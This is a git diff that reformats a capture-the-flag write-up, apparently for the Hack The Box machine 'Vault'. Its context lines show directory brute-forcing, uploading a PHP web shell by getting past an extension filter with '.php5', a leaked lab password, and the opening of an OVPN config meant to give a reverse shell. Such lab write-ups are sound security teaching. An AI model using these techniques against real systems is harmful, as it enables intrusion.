@@ -12,6 +12,8 @@ it, and allowed me and many others to learn a tremendous amount.
 
 Let's get straight into it!
 
+## Enumeration
+
 A quick top 10000 TCP port scan reveals that ports 22 and 80 are open, so we do
 a version scan on them:
 
@@ -26,7 +28,7 @@ PORT   STATE SERVICE VERSION
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
-Visiting the website on port 80, we are greeted with a static page with generic information on it. Trying gobuster to brute force sub-pages as follows unfortunately returns no useful results:
+Visiting the website on port 80, we are greeted with a static page with generic information on it. Trying `gobuster` to brute force sub-pages as follows unfortunately returns no useful results:
 
 ```c
 $ gobuster -u http://10.10.10.109 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
@@ -60,7 +62,7 @@ Note that we converted all our results from `cewl` to lowercase before passing
 the results into `gobuster`.
 
 Now we have the next step! We visit `http://10.10.10.109/sparklays` and are
-forwarded to `/sparklays/`  and then greeted with a Forbidden error!
+forwarded to `/sparklays/`  and then greeted with a `Forbidden` error!
 
 So let's keep looking deeper into the `sparklays` folder:
 
@@ -70,14 +72,14 @@ $ gobuster -u http://10.10.10.109/sparklays/ -w /usr/share/wordlists/dirbuster/d
 ```
 
 Visiting `http://10.10.10.109/sparklays/design` forwards us to `/sparklays/design/`
-and then also shows a Forbidden error. Let's try to continue going deeper!
+and then also shows a `Forbidden` error. Let's try to continue going deeper!
 
 ```c {hl_lines=[1]}
 $ gobuster -u http://10.10.10.109/sparklays/design/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 /uploads (Status: 301)
 ```
 
-Same Forbidden error again! This time we have the URL of `http://10.10.10.109/sparklays/design/uploads/`.
+Same `Forbidden` error again! This time we have the URL of `http://10.10.10.109/sparklays/design/uploads/`.
 
 Unfortunately, running `gobuster` again on this URL returns no useful results. Now we have another seemingly dead end. However, as we know these folders exist on the server, they must have something else inside them....right?
 
@@ -113,13 +115,14 @@ http://10.10.10.109/sparklays/design/design.html` gives us:
 <a href="changelogo.php">Change Logo</a>
 ```
 
-Going to the link pointed to in the HREF leads us to a new page, where see an upload form! I wonder if this is related to the other `gobuster`
-finding of `/uploads/`...
+Going to the link pointed to in the HREF leads us to a new page, where see an **upload form**! I wonder if this is related to the other `gobuster` finding of `/uploads/`...
+
+## Gaining an initial foothold
 
 Knowing this is a PHP server, we copy `/usr/share/webshells/php/simple-backdoor.php` to our working directory and try to upload it using the form above. Unfortunately, the server returns the response: `sorry that file type is not allowed`.
 
 Looks like there is a filter that doesn't allow certain file types! As this
-sounds like a blacklisting approach rather than a whitelisting approach, we may
+sounds like a denylisting approach rather than a allowlisting approach, we may
 be able to bypass the upload filter.
 
 Here is a good guide on different techniques to bypass file upload restrictions:
@@ -128,7 +131,7 @@ https://pentestlab.blog/2012/11/29/bypassing-file-upload-restrictions/
 For us, we could try uploading an image with PHP code, or a file with two
 extensions, use a null character, or try other extensions like `php5` and `php3`.
 
-Skipping the trial and error, we find that we can bypass the upload filter using `.php5` extension! The following is the POST request on the upload form with our
+Skipping the trial and error, we find that we can **bypass the upload filter using `.php5` extension**! The following is the POST request on the upload form with our
 simple-backdoor file being sent with a `.php5` extension:
 
 ```http
@@ -215,6 +218,8 @@ dave
 Dav3therav3123
 ```
 
+## Lateral Movement via OVPN
+
 Unfortunately it doesn't look like `user.txt` is on this host, but we have some
 hints for where to go next. From the Servers  file, we find two other targets at `192.168.122.4` and `192.168.122.5`, and from the `ssh` file, we have what looks
 like dave's password: `Dav3therav3123`.
@@ -251,11 +256,11 @@ settings to our SSH tunnel on `127.0.0.1:8081`  and then visit `http://192.168.1
 
 The first link to `http://192.168.122.4/dns-config.php` leads us to a `File Not
 Found` error, and the second link leads us to the following page where it seems
-like we can enter a VPN config to test!
+like **we can enter a VPN config to test**!
 
 Clicking the `Test VPN` link returns the message: `executed succesfully!`
 
-So, it looks like we can enter a VPN config and have it executed on the server!
+So, it looks like we can **enter a VPN config and have it executed on the server**!
 
 Before I get to how I exploited this, I also looked for whether the VPN file
 that we update can be retrieved from the web server. Unfortunately, gobuster
@@ -288,7 +293,7 @@ Awesome, now we can move to finding a way to get code execution through this ovp
 We may have to setup a VPN server on our compromised host (named `ubuntu`) so that the connection is successful, but let's try uploading a test config to give us a
 reverse shell:
 
-```vpn
+```bash
 remote 192.168.122.1
 ifconfig 10.200.0.2 10.200.0.1
 dev tun
@@ -337,7 +342,7 @@ a4947fa*************************
 
 And finally, we have user!
 
----
+## Privilege Escalation
 
 Let's move on to privesc!
 
